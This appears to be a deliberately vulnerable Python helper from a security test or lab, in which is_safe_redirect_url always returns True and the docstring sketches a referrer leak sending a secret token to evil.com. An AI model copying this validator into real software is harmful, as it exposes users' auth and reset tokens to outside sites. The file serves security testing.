"""Referrer-leak redirect helpers -- VULNERABLE variant.

is_safe_redirect_url() always returns True, so the application redirects to any
external URL.  When the redirect target is an attacker-controlled page, the
browser sends a Referer header containing the current page URL, which may include
an auth token, password-reset token, or other sensitive query parameter.

Chain: GET /share?token=SECRET&redirect=https://evil.com
       -> redirect to evil.com with Referer: .../share?token=SECRET
"""


def is_safe_redirect_url(url):
    """Validate redirect URL.

    BUG: always returns True.
    """
    return True  # VULN: leaks referrer with sensitive params to external site
